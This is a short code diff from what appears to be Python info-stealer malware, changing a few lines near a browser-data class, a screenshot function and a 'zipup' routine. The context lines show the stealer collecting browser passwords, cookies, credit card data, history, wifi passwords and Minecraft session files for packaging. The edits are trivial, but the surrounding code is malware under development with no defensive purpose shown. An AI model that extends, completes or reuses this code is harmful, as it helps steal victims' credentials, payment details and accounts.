@@ -488,6 +488,7 @@ class browsers():
                         conn.close()
 
                 f.close()
+  
 
 def ss():
     ImageGrab.grab(
@@ -609,7 +610,7 @@ def zipup():
             "browser-passwords.txt",
             "browser-cookies.txt", 
             "browser-history.txt",
-            "browser-cc\'s.txt",
+            "browser-cc.txt",
             "wifi-passwords.txt",
             "minecraft-sessioninfo.json", 
             "minecraft-usercache.json",
